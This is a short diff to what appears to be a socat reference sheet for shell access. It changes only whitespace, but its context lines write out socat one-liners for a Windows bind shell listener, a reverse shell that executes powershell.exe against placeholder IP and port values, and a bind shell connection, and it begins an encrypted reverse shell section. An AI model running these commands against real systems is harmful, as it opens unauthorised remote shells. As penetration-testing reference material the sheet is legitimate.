@@ -12,6 +12,7 @@ Bind Shell Listener:
   socat TCP-L:<PORT> EXEC:powershell.exe,pipes
               Bind shell listener on a Windows target
 
+
 ################ CONNECTIONS ################
 Reverse Shell Connection:
   socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
@@ -20,6 +21,7 @@ Reverse Shell Connection:
 Bind Shell Connection:
   socat TCP:<TARGET_IP>:<TARGET_PORT> -
               Connection to the bind shell listener on a Linux/Attacker target
+
 
 ################ ENCRYPTED COMMUNCIATION ################
 Socat Encrypted Reverse Shel Communication:
